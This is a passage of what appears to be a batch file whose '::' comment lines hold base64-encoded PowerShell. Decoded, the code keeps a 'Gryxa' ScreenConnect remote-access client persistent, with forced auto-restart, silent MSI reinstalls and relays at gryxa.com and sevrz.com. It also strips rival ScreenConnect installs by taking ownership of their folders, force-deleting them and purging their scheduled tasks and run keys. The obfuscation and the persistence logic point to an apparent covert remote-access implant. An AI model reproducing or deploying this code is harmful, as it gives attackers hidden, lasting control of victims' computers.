::ZWVwX29rIGZwPSRydW5uaW5nRnAgcmVsYXk9JHRjcFIgdWk9JHRjcFUiDQogICAg
::ICAgICAgICByZXR1cm4gIkhFQUxUSFl8JHJ1bm5pbmdGcHxydW5uaW5nPTF8ZGVl
::cD0xfHJlbGF5PSR0Y3BSfHVpPSR0Y3BVIg0KICAgICAgICB9DQogICAgICAgIEdM
::b2cgImhlYWx0aHlfcnVubmluZyBmcD0kcnVubmluZ0ZwIg0KICAgICAgICByZXR1
::cm4gIkhFQUxUSFl8JHJ1bm5pbmdGcHxydW5uaW5nPTEiDQogICAgfQ0KDQogICAg
::JHN0ID0gR2V0LUdyeXhhU3RhdHVzICRmcA0KICAgIEdMb2cgInN0YXR1cz0kc3Qg
::Zm9yY2U9JEZvcmNlIGRlZXA9JERlZXAiDQogICAgJGtpbmQgPSAkc3QuU3BsaXQo
::J3wnKVswXQ0KDQogICAgc3dpdGNoICgka2luZCkgew0KICAgICAgICAnSEVBTFRI
::WScgeyByZXR1cm4gJHN0IH0NCiAgICAgICAgJ0JST0tFTicgew0KICAgICAgICAg
::ICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRmcCkiDQogICAgICAg
::ICAgICAmIHNjLmV4ZSBjb25maWcgJG5hbWUgc3RhcnQ9IGF1dG8gMj4mMSB8IE91
::dC1OdWxsDQogICAgICAgICAgICAmIHNjLmV4ZSBmYWlsdXJlICRuYW1lIHJlc2V0
::PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzMwMDAvcmVzdGFydC8zMDAwL3Jlc3Rh
::cnQvMzAwMCAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgICAgICYgc2MuZXhlIHN0
::YXJ0ICRuYW1lIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgU3RhcnQtU2xl
::ZXAgLVNlY29uZHMgNg0KICAgICAgICAgICAgJiBzYy5leGUgc3RhcnQgJG5hbWUg
::Mj4mMSB8IE91dC1OdWxsDQogICAgICAgICAgICBpZiAoVGVzdC1TY1J1bm5pbmcg
::JGZwKSB7IEdMb2cgJ3N0YXJ0ZWRfb2snOyByZXR1cm4gIkhFQUxUSFl8JGZwfHN0
::YXJ0ZWQ9MSIgfQ0KICAgICAgICAgICAgJG1zaSA9IEdldC1Hcnl4YU1zaQ0KICAg
::ICAgICAgICAgaWYgKC1ub3QgJG1zaSkgeyBHTG9nICdtc2lfdW5hdmFpbGFibGUn
::OyByZXR1cm4gIlVOSEVBTFRIWXwkZnB8bXNpLXVuYXZhaWxhYmxlIiB9DQogICAg
::ICAgICAgICAkbmV3RnAgPSBHZXQtRnBGcm9tUHJvZHVjdE5hbWUgKEdldC1Nc2lQ
::cm9wZXJ0eSAkbXNpICdQcm9kdWN0TmFtZScpDQogICAgICAgICAgICBpZiAoLW5v
::dCAkbmV3RnApIHsgJG5ld0ZwID0gJGZwIH0NCiAgICAgICAgICAgIEdMb2cgImJy
::b2tlbl9jbGVhbl9yZWluc3RhbGwgZnA9JGZwIG5ldz0kbmV3RnAiDQogICAgICAg
::ICAgICAjIEw0NDogc2VydmljZSBleGlzdHMgU3RvcHBlZCDigJQgc3RhcnQtb25s
::eSBhbHJlYWR5IGZhaWxlZDsgZG8gTk9UIC94IGEgcmVnaXN0ZXJlZCBwcm9kdWN0
::DQogICAgICAgICAgICBpZiAoVGVzdC1TY1NlcnZpY2VFeGlzdHMgJGZwKSB7DQog
::ICAgICAgICAgICAgICAgR0xvZyAiYnJva2VuX3JlZnVzZWRfcmVpbnN0YWxsX3N2
::Y19leGlzdHMiDQogICAgICAgICAgICAgICAgcmV0dXJuICJVTkhFQUxUSFl8JGZw
::fHN2Yy1leGlzdHMtc3RhcnQtZmFpbGVkIg0KICAgICAgICAgICAgfQ0KICAgICAg
::ICAgICAgaWYgKCRuZXdGcCAtZXEgJGZwKSB7DQogICAgICAgICAgICAgICAgU2V0
::LUdyeXhhRnAgJG5ld0ZwDQogICAgICAgICAgICAgICAgU3RhcnQtR3J5eGFJbnN0
::YWxsICRtc2kgJG5ld0ZwIChKb2luLVBhdGggJFdvcmtEaXIgJ21zaV9ncnl4YV9k
::ZXRhY2hlZC5sb2cnKQ0KICAgICAgICAgICAgICAgIE1hcmstR3J5eGFSZWluc3Rh
::bGwNCiAgICAgICAgICAgICAgICByZXR1cm4gIklORkxJR0hUfCRuZXdGcHxpbnN0
::YWxsLXNwYXduZWQ9MSINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIFNldC1H
::cnl4YUZwICRuZXdGcA0KICAgICAgICAgICAgU3RhcnQtR3J5eGFJbnN0YWxsICRt
::c2kgJG5ld0ZwIChKb2luLVBhdGggJFdvcmtEaXIgJ21zaV9ncnl4YV9kZXRhY2hl
::ZC5sb2cnKQ0KICAgICAgICAgICAgTWFyay1Hcnl4YVJlaW5zdGFsbA0KICAgICAg
::ICAgICAgcmV0dXJuICJJTkZMSUdIVHwkbmV3RnB8YnJva2VuLXNwYXduZWQ9MSIg
::ICAgICAgIH0NCiAgICAgICAgJ1NUVUNLJyB7DQogICAgICAgICAgICBpZiAoVGVz
::dC1TY0RpciAkZnApIHsNCiAgICAgICAgICAgICAgICBHTG9nICJzdHVja19zZXJ2
::aWNlX3JlY3JlYXRlIGZwPSRmcCINCiAgICAgICAgICAgICAgICBSZXBhaXItU0NT
::ZXJ2aWNlICRmcA0KICAgICAgICAgICAgICAgIGlmIChUZXN0LVNjUnVubmluZyAk
::ZnApIHsgR0xvZyAnc2VydmljZV9yZWNyZWF0ZWRfb2snOyByZXR1cm4gIkhFQUxU
::SFl8JGZwfHN2Yy1yZWNyZWF0ZWQ9MSIgfQ0KICAgICAgICAgICAgfQ0KICAgICAg
::ICAgICAgJG1zaSA9IEdldC1Hcnl4YU1zaQ0KICAgICAgICAgICAgaWYgKC1ub3Qg
::JG1zaSkgeyBHTG9nICdtc2lfdW5hdmFpbGFibGUnOyByZXR1cm4gIlVOSEVBTFRI
::WXwkZnB8bXNpLXVuYXZhaWxhYmxlIiB9DQogICAgICAgICAgICAkbmV3RnAgPSBH
::ZXQtRnBGcm9tUHJvZHVjdE5hbWUgKEdldC1Nc2lQcm9wZXJ0eSAkbXNpICdQcm9k
::dWN0TmFtZScpDQogICAgICAgICAgICBpZiAoLW5vdCAkbmV3RnApIHsgJG5ld0Zw
::ID0gJGZwIH0NCiAgICAgICAgICAgIEdMb2cgInN0dWNrX251a2VfYW5kX2luc3Rh
::bGwgZnA9JGZwIG5ldz0kbmV3RnAiDQogICAgICAgICAgICBDbGVhci1Hcnl4YUFy
::cCAkZnANCiAgICAgICAgICAgIGlmICgkbmV3RnAgLW5lICRmcCkgeyBDbGVhci1H
::cnl4YUFycCAkbmV3RnAgfQ0KICAgICAgICAgICAgU2V0LUdyeXhhRnAgJG5ld0Zw
::DQogICAgICAgICAgICBTdGFydC1Hcnl4YUluc3RhbGwgJG1zaSAkbmV3RnAgKEpv
::aW4tUGF0aCAkV29ya0RpciAnbXNpX2dyeXhhX2RldGFjaGVkLmxvZycpDQogICAg
::ICAgICAgICBNYXJrLUdyeXhhUmVpbnN0YWxsDQogICAgICAgICAgICByZXR1cm4g
::IklORkxJR0hUfCRuZXdGcHxpbnN0YWxsLXNwYXduZWQ9MSINCiAgICAgICAgfQ0K
::ICAgICAgICBkZWZhdWx0IHsNCiAgICAgICAgICAgIGlmIChUZXN0LVNjRGlyICRm
::cCkgew0KICAgICAgICAgICAgICAgIEdMb2cgImFic2VudF9zZXJ2aWNlX3JlY3Jl
::YXRlIGZwPSRmcCINCiAgICAgICAgICAgICAgICBSZXBhaXItU0NTZXJ2aWNlICRm
::cA0KICAgICAgICAgICAgICAgIGlmIChUZXN0LVNjUnVubmluZyAkZnApIHsgR0xv
::ZyAnc2VydmljZV9yZWNyZWF0ZWRfb2snOyByZXR1cm4gIkhFQUxUSFl8JGZwfHN2
::Yy1yZWNyZWF0ZWQ9MSIgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJG1z
::aSA9IEdldC1Hcnl4YU1zaQ0KICAgICAgICAgICAgaWYgKC1ub3QgJG1zaSkgeyBH
::TG9nICdtc2lfdW5hdmFpbGFibGUnOyByZXR1cm4gIlVOSEVBTFRIWXwkZnB8bXNp
::LXVuYXZhaWxhYmxlIiB9DQogICAgICAgICAgICAkbmV3RnAgPSBHZXQtRnBGcm9t
::UHJvZHVjdE5hbWUgKEdldC1Nc2lQcm9wZXJ0eSAkbXNpICdQcm9kdWN0TmFtZScp
::DQogICAgICAgICAgICBpZiAoLW5vdCAkbmV3RnApIHsgR0xvZyAnZnBfcGFyc2Vf
::ZmFpbCc7IHJldHVybiAiVU5IRUFMVEhZfCRmcHxtc2ktZnAtcGFyc2UtZmFpbCIg
::fQ0KICAgICAgICAgICAgR0xvZyAiYWJzZW50X2luc3RhbGwgZnA9JG5ld0ZwIg0K
::ICAgICAgICAgICAgU2V0LUdyeXhhRnAgJG5ld0ZwDQogICAgICAgICAgICBTdGFy
::dC1Hcnl4YUluc3RhbGwgJG1zaSAkbmV3RnAgKEpvaW4tUGF0aCAkV29ya0RpciAn
::bXNpX2dyeXhhX2RldGFjaGVkLmxvZycpDQogICAgICAgICAgICBNYXJrLUdyeXhh
::UmVpbnN0YWxsDQogICAgICAgICAgICByZXR1cm4gIklORkxJR0hUfCRuZXdGcHxp
::bnN0YWxsLXNwYXduZWQ9MSINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KZnVuY3Rp
::b24gSW52b2tlLUV4dGVybWluYXRlIHsNCiAgICAjIEw0NTogSEFORFMtT0ZGIOKA
::lCBkbyBub3QgdG91Y2ggYW55IFNjcmVlbkNvbm5lY3Qgd2hpbGUgZGlhZ25vc2lu
::ZyBkaXNjb25uZWN0cy4NCiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdl
::eHRlcm1pbmF0ZS5sb2cnDQogICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRs
::b2cgLVZhbHVlICgnezB9IGV4dGVybWluYXRlX1NLSVBQRURfTDQ1IGhhbmRzLW9m
::Zi1hbGwtc2MnIC1mIChHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1t
::OnNzJykpIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgcmV0dXJu
::ICdTS0lQfGhhbmRzLW9mZi1zYy1MNDUnDQogICAgIyBMNzogdHJ1ZSByZW1vdmFs
::IChkaXNhYmxlZCkuLi4NCiAgICAkcnVubmluZ0cgPSBGaW5kLVJ1bm5pbmdHcnl4
::YUZwDQogICAgaWYgKCRydW5uaW5nRykgeyBTZXQtR3J5eGFGcCAkcnVubmluZ0cg
::fQ0KICAgICRrZWVwID0gQChHZXQtS2VlcEZpbmdlcnByaW50cykNCiAgICAkbiA9
::IEB7IHN2YyA9IDA7IHByb2MgPSAwOyBkaXIgPSAwOyBwcm9kdWN0ID0gMDsgcm1t
::ID0gMDsgZmFpbCA9IDAgfQ0KICAgIGZ1bmN0aW9uIExvZyhbc3RyaW5nXSRtKSB7
::DQogICAgICAgICRsaW5lID0gJ3swfSB7MX0nIC1mIChHZXQtRGF0ZSAtRm9ybWF0
::ICd5eXl5LU1NLWRkIEhIOm1tOnNzJyksICRtDQogICAgICAgIEFkZC1Db250ZW50
::IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAkbGluZSAtRXJyb3JBY3Rpb24gU2ls
::ZW50bHlDb250aW51ZQ0KICAgICAgICAjIE80MTogZG8gTk9UIFdyaXRlLU91dHB1
::dCBMb2cgbGluZXMgKHBvbGx1dGVzIGZvciAvZiBjYWxsZXJzKQ0KICAgIH0NCiAg
::ICAjIFByb3RlY3QgR3J5eGEgZHVyaW5nIHN0YXJ0IHJhY2U6IG9ubHkgbGl2ZSBT
::QyBwcm9jcyB3aXRoIHZlcmlmaWVkIEdyeXhhIHJlbGF5L0ZQDQogICAgR2V0LUNp
::bUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUZpbHRlciAiTmFtZSBsaWtlICdTY3Jl
::ZW5Db25uZWN0JSciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9y
::RWFjaC1PYmplY3Qgew0KICAgICAgICAkYmxvYiA9ICIkKFtzdHJpbmddJF8uRXhl
::Y3V0YWJsZVBhdGgpICQoW3N0cmluZ10kXy5Db21tYW5kTGluZSkiDQogICAgICAg
::IGlmICgkYmxvYiAtbWF0Y2ggJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IFwoKFswLTlh
::LWZBLUZdezE2fSlcKScpIHsNCiAgICAgICAgICAgICRmcCA9ICRNYXRjaGVzWzFd
::LlRvTG93ZXIoKQ0KICAgICAgICAgICAgaWYgKCRmcCAtbm90aW4gJHNjcmlwdDpT
::ZXZyektlZXAgLWFuZCAoVGVzdC1Jc0dyeXhhRnAgJGZwKSAtYW5kICRmcCAtbm90
::aW4gJGtlZXApIHsNCiAgICAgICAgICAgICAgICAka2VlcCArPSAkZnANCiAgICAg
::ICAgICAgICAgICBTZXQtR3J5eGFGcCAkZnANCiAgICAgICAgICAgICAgICBMb2cg
::ImtlZXBfYWRkX2Zyb21fcHJvYyBmcD0kZnAiDQogICAgICAgICAgICB9DQogICAg
::ICAgIH0NCiAgICB9DQogICAgZnVuY3Rpb24gSXMtS2VlcGVyKFtzdHJpbmddJHMp
::IHsNCiAgICAgICAgaWYgKC1ub3QgJHMpIHsgcmV0dXJuICRmYWxzZSB9DQogICAg
::ICAgICMgYWxsb3cgaWYgcmVsYXkgc2VydmVyL2RvbWFpbiBpcyBHcnl4YSBPUiBm
::aW5nZXJwcmludCBpcyBhIGtlZXBlcg0KICAgICAgICBpZiAoJHMgLW1hdGNoICco
::P2kpZ3J5eGFcLmNvbScpIHsgcmV0dXJuICR0cnVlIH0NCiAgICAgICAgZm9yZWFj
::aCAoJGsgaW4gJGtlZXApIHsgaWYgKCRzIC1saWtlICIqJGsqIikgeyByZXR1cm4g
::JHRydWUgfSB9DQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQogICAgZnVu
::Y3Rpb24gRm9yY2UtUmVtb3ZlRGlyKFtzdHJpbmddJGQpIHsNCiAgICAgICAgaWYg
::KC1ub3QgJGQgLW9yIC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7
::IHJldHVybiAkdHJ1ZSB9DQogICAgICAgIEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Q
::cm9jZXNzIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAg
::ICAgIFdoZXJlLU9iamVjdCB7ICRfLkV4ZWN1dGFibGVQYXRoIC1hbmQgJF8uRXhl
::Y3V0YWJsZVBhdGguU3RhcnRzV2l0aCgkZCwgW1N0cmluZ0NvbXBhcmlzb25dOjpP
::cmRpbmFsSWdub3JlQ2FzZSkgfSB8DQogICAgICAgICAgICBGb3JFYWNoLU9iamVj
::dCB7IFN0b3AtUHJvY2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1Gb3JjZSAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZSB9DQogICAgICAgICMgdW4taGFyZCBzZWxm
::LXByb3RlY3RlZCBkaXJzIChmb3JlaWduL29sZCBTQyBsb2NrcyBBQ0xzK2F0dHJz
::IHRvIHN1cnZpdmUgcmVtb3ZhbCkNCiAgICAgICAgJiB0YWtlb3duLmV4ZSAvRiAk
::ZCAvUiAvRCBZIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAmIGljYWNscy5leGUg
::JGQgL3Jlc2V0IC9UIC9DIC9RIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICBjbWQu
::ZXhlIC9jICJhdHRyaWIgLWggLXMgLXIgL3MgL2QgYCIkZGAiIGAiJGRcKi4qYCIi
::IDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAmIGljYWNscy5leGUgJGQgL2dyYW50
::ICcqUy0xLTUtMzItNTQ0OihPSSkoQ0kpRicgL1QgL0MgL1EgMj4mMSB8IE91dC1O
::dWxsDQogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJ0FkbWluaXN0cmF0
::b3JzOihPSSkoQ0kpRicgL1QgL0MgL1EgMj4mMSB8IE91dC1OdWxsDQogICAgICAg
::ICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJ1NZU1RFTTooT0kpKENJKUYnIC9UIC9D
::IC9RIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJh
::bFBhdGggJGQgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
::bnRpbnVlDQogICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7
::DQogICAgICAgICAgICBjbWQuZXhlIC9jICJhdHRyaWIgLWggLXMgLXIgL3MgL2Qg
::YCIkZFwqLipgIiIgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICAgICBjbWQuZXhl
::IC9jICJybWRpciAvcyAvcSBgIiRkYCIiIDI+JjEgfCBPdXQtTnVsbA0KICAgICAg
::ICB9DQogICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7DQog
::ICAgICAgICAgICAkZW1wdHkgPSBKb2luLVBhdGggJGVudjpURU1QICgib3duX2Vt
::cHR5XyIgKyBbZ3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygnTicpKQ0KICAgICAg
::ICAgICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkZW1wdHkg
::LUZvcmNlIHwgT3V0LU51bGwNCiAgICAgICAgICAgICYgcm9ib2NvcHkuZXhlICRl
::bXB0eSAkZCAvTUlSIC9SOjAgL1c6MCAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAg
::ICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZW1wdHkgLUZvcmNlIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICBSZW1vdmUtSXRl
::bSAtTGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBT
::aWxlbnRseUNvbnRpbnVlDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIC1ub3Qg
::KFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpDQogICAgfQ0KICAgIGZ1bmN0aW9u
::IFVuaW5zdGFsbC1Qcm9kdWN0S2V5KCRrZXkpIHsNCiAgICAgICAgJGd1aWQgPSAk
::a2V5LlBTQ2hpbGROYW1lDQogICAgICAgICRwcm9wID0gR2V0LUl0ZW1Qcm9wZXJ0
::eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAg
::ICAgICAkZG4gPSAkcHJvcC5EaXNwbGF5TmFtZQ0KICAgICAgICAjIEwzOS9MNDQ6
::IHJlZnVzZSAveCBpZiBEaXNwbGF5TmFtZSBGUCBpcyBhIGtlZXBlciBPUiBHcnl4
::YSBQcm9kdWN0Q29kZSAoc2hhcmVkIEdVSUQga2lsbHMgR3Vlc3QpDQogICAgICAg
::IGlmICgkZ3VpZCAtZXEgJ3s5RDdDQzQxOC1BMzU2LTk2OTMtRENDNS00MUVDNDRE
::MDNCMzF9Jykgew0KICAgICAgICAgICAgTG9nICJwcm9kdWN0X3NraXBfZ3J5eGFf
::cHJvZHVjdGNvZGUgZ3VpZD0kZ3VpZCINCiAgICAgICAgICAgIHJldHVybiAkZmFs
::c2UNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJGRuIC1tYXRjaCAnU2NyZWVuQ29u
::bmVjdCBDbGllbnQgXCgoWzAtOWEtZkEtRl17MTZ9KVwpJykgew0KICAgICAgICAg
::ICAgJGZwRG4gPSAkTWF0Y2hlc1sxXS5Ub0xvd2VyKCkNCiAgICAgICAgICAgIGlm
::ICgkZnBEbiAtaW4gJGtlZXAgLW9yIChUZXN0LUlzR3J5eGFGcCAkZnBEbikpIHsN
::CiAgICAgICAgICAgICAgICBMb2cgInByb2R1Y3Rfc2tpcF9rZWVwZXJfZnAgWyRk
::bl0gZ3VpZD0kZ3VpZCINCiAgICAgICAgICAgICAgICByZXR1cm4gJGZhbHNlDQog
::ICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRndWlkIC1saWtl
::ICd7Kn0nKSB7DQogICAgICAgICAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhl
::Yy5leGUgLUFyZ3VtZW50TGlzdCAiL3ggJGd1aWQgL3FuIC9ub3Jlc3RhcnQgUkVC
::T09UPVJlYWxseVN1cHByZXNzIiAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxl
::IEhpZGRlbg0KICAgICAgICAgICAgTG9nICJwcm9kdWN0X21zaWV4ZWMgWyRkbl0g
::Z3VpZD0kZ3VpZCBleGl0PSQoJHAuRXhpdENvZGUpIg0KICAgICAgICAgICAgaWYg
::KCRwLkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAxNjE0LCAzMDEwKSB7IHJldHVybiAk
::dHJ1ZSB9DQogICAgICAgIH0NCiAgICAgICAgJHVzID0gJHByb3AuVW5pbnN0YWxs
::U3RyaW5nDQogICAgICAgIGlmICgkdXMpIHsNCiAgICAgICAgICAgIHRyeSB7DQog
::ICAgICAgICAgICAgICAgaWYgKCR1cyAtbWF0Y2ggJyg/aSltc2lleGVjJykgew0K
::ICAgICAgICAgICAgICAgICAgICAkYXJncyA9ICgkdXMgLXJlcGxhY2UgJyg/aSle
::Liptc2lleGVjKFwuZXhlKT9ccyonLCAnJykNCiAgICAgICAgICAgICAgICAgICAg
::aWYgKCRhcmdzIC1ub3RtYXRjaCAnL3FuJykgeyAkYXJncyA9ICIkYXJncyAvcW4g
::L25vcmVzdGFydCIgfQ0KICAgICAgICAgICAgICAgICAgICAkcCA9IFN0YXJ0LVBy
::b2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAkYXJncyAtV2FpdCAtUGFz
::c1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbg0KICAgICAgICAgICAgICAgICAgICBM
::b2cgInByb2R1Y3RfdW5pbnN0YWxsc3RyaW5nX21zaSBbJGRuXSBleGl0PSQoJHAu
::RXhpdENvZGUpIg0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gKCRwLkV4aXRD
::b2RlIC1pbiAwLCAxNjA1LCAxNjE0LCAzMDEwKQ0KICAgICAgICAgICAgICAgIH0g
::ZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBj
::bWQuZXhlIC1Bcmd1bWVudExpc3QgIi9jICR1cyAvUyAvc2lsZW50IC9xdWlldCAv
::cW4iIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuDQogICAgICAg
::ICAgICAgICAgICAgIExvZyAicHJvZHVjdF91bmluc3RhbGxzdHJpbmdfZXhlIFsk
::ZG5dIGV4aXQ9JCgkcC5FeGl0Q29kZSkiDQogICAgICAgICAgICAgICAgICAgIHJl
::dHVybiAoJHAuRXhpdENvZGUgLWVxIDApDQogICAgICAgICAgICAgICAgfQ0KICAg
::ICAgICAgICAgfSBjYXRjaCB7IExvZyAicHJvZHVjdF91bmluc3RhbGxzdHJpbmdf
::RkFJTCBbJGRuXSAkXyIgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkZmFs
::c2UNCiAgICB9DQoNCiAgICAjIOKUgOKUgCBkZXN0cm95IGZvcmVpZ24vb2xkIFND
::IHBlcnNpc3RlbmNlICh3YXRjaGRvZyB0YXNrcyArIHJ1biBrZXlzKSDilIDilIAN
::CiAgICAjIFJvb3QgY2F1c2Ugb2YgImNvbm5lY3RzIHRoZW4gZHJvcHMiOiBhIG5v
::bi1rZWVwZXIgLyBvbGQtRlAgU2NyZWVuQ29ubmVjdCBrZWVwcyBhDQogICAgIyBz
::Y2hlZHVsZWQgdGFzayBvciBSdW4ga2V5IHRoYXQgcmUtcnVucyBpdHMgY2FjaGVk
::IG1zaWV4ZWMgL2kuIEV2ZXJ5IHN1Y2ggL2kgZmlyZXMNCiAgICAjIFJlbW92ZUV4
::aXN0aW5nUHJvZHVjdHMgb24gdGhlIFNIQVJFRCBTQyBVcGdyYWRlQ29kZSBhbmQg
::c3RyaXBzIHRoZSBrZWVwZXIgR3J5eGEuDQogICAgIyBSZW1vdmluZyBvbmx5IHRo
::ZSBwcm9kdWN0IGlzIG5vdCBlbm91Z2gg4oCUIHRoZSBwZXJzaXN0ZW5jZSByZWlu
::c3RhbGxzIGl0IChhbmQga2lsbHMNCiAgICAjIEdyeXhhIGFnYWluKS4gUHVyZ2Ug
::dGhlIHBlcnNpc3RlbmNlIEZJUlNUIHNvIHByb2R1Y3Qvc3ZjL2RpciByZW1vdmFs
::IGlzIHBlcm1hbmVudC4NCiAgICBmdW5jdGlvbiBHZXQtTm9uS2VlcGVyU2NGcHMg
::ew0KICAgICAgICAkZnBzID0gQHt9DQogICAgICAgIEdldC1TZXJ2aWNlIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
::ICAgICAgICAgaWYgKCRfLk5hbWUgLW1hdGNoICdTY3JlZW5Db25uZWN0IENsaWVu
::dCBcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7DQogICAgICAgICAgICAgICAgJGZw
::c1skbWF0Y2hlc1sxXS5Ub0xvd2VyKCldID0gJHRydWUNCiAgICAgICAgICAgIH0N
::CiAgICAgICAgfQ0KICAgICAgICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2Vz
::cyAtRmlsdGVyICJOYW1lIGxpa2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVycm9yQWN0
::aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAg
::ICAgICBpZiAoIiQoW3N0cmluZ10kXy5FeGVjdXRhYmxlUGF0aCkgJChbc3RyaW5n
::XSRfLkNvbW1hbmRMaW5lKSIgLW1hdGNoICdcKChbMC05YS1mQS1GXXsxNn0pXCkn
::KSB7DQogICAgICAgICAgICAgICAgJGZwc1skbWF0Y2hlc1sxXS5Ub0xvd2VyKCld
::ID0gJHRydWUNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBmb3Jl
::YWNoICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7DQogICAgICAg
::ICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51ZSB9DQog
::ICAgICAgICAgICBHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxl
::bnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgICAg
::ICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRfLlBTUGF0aCAtRXJyb3JBY3Rpb24g
::U2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgICAgICBp
::ZiAoJGRuIC1tYXRjaCAnU2NyZWVuQ29ubmVjdCBDbGllbnQgXCgoWzAtOWEtZkEt
::Rl17MTZ9KVwpJykgeyAkZnBzWyRtYXRjaGVzWzFdLlRvTG93ZXIoKV0gPSAkdHJ1
::ZSB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAo
::JGJhc2UgaW4gQCgkZW52OlByb2dyYW1GaWxlcywgJHtlbnY6UHJvZ3JhbUZpbGVz
::KHg4Nil9KSkgew0KICAgICAgICAgICAgaWYgKC1ub3QgJGJhc2UgLW9yIC1ub3Qg
::KFRlc3QtUGF0aCAkYmFzZSkpIHsgY29udGludWUgfQ0KICAgICAgICAgICAgR2V0
::LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGJhc2UgLURpcmVjdG9yeSAtRm9yY2Ug
::LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7
::DQogICAgICAgICAgICAgICAgaWYgKCRfLk5hbWUgLW1hdGNoICdTY3JlZW5Db25u
::ZWN0IENsaWVudCBcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7ICRmcHNbJG1hdGNo
::ZXNbMV0uVG9Mb3dlcigpXSA9ICR0cnVlIH0NCiAgICAgICAgICAgIH0NCiAgICAg
::ICAgfQ0KICAgICAgICBAKCRmcHMuS2V5cyB8IFdoZXJlLU9iamVjdCB7ICRfIC1u
::b3RpbiAka2VlcCB9KQ0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIFRlc3QtU2NLZWVw
::ZXJSZWYoW3N0cmluZ10kcykgew0KICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1
::cm4gJGZhbHNlIH0NCiAgICAgICAgaWYgKCRzIC1tYXRjaCAnKD9pKWdyeXhhXC5j
::b218c2V2cnpcLmNvbScpIHsgcmV0dXJuICR0cnVlIH0NCiAgICAgICAgaWYgKCRz
::IC1tYXRjaCAnKD9pKW93bihfbW9ufF9saWJ8X3NlY3VyZSk/XC4oY21kfHBzMSl8
::Z3J5eGFfYm9vdHxcLnd1Y2FjaGUnKSB7IHJldHVybiAkdHJ1ZSB9DQogICAgICAg
